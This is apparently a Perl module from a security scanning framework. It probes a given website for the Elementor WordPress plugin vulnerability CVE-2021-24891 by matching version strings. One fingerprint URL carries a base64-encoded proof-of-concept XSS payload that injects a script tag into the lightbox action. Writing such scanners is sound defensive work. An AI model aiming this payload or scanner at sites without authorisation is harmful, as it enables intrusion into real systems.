package Spellbook::Advisory::CVE_2021_24891 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @results);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//x) {
                $target = "https://$target";
            }

            my $useragent = Spellbook::Core::UserAgent -> new();

            my $fingerprints = {
                1 => {
                    endpoint => "/wp-content/plugins/elementor/assets/js/frontend.min.js",
                    regex    => "elementor[\\s-]*v(([0-3]+\\.(([0-5]+\\.[0-5]+)|[0-4]+\\.[0-9]+))|[0-2]+[0-9.]+)"
                },
                2 => {
                    endpoint => "/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9",
                    regex    => "elementor[\\s-]*v(([0-3]+\\.(([0-5]+\\.[0-5]+)|[0-4]+\\.[0-9]+))|[0-2]+[0-9.]+)"
                }
            };

            foreach my $key (keys %$fingerprints) {
                my $inner_hash = $fingerprints -> {$key};
                my $request = $useragent -> get($target . $inner_hash -> {endpoint});

                if (($request -> code() == 200) && $request -> decoded_content() =~ m/@{[ $inner_hash -> {regex} ]}/x) {
                    push @results, $target . $inner_hash -> {endpoint};
                }
            }

            return @results;
        }

        if ($help) {
            return "
                \rAdvisory::CVE_2021_24891
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target\n\n";
        }

        return 0;
    }
}

1;
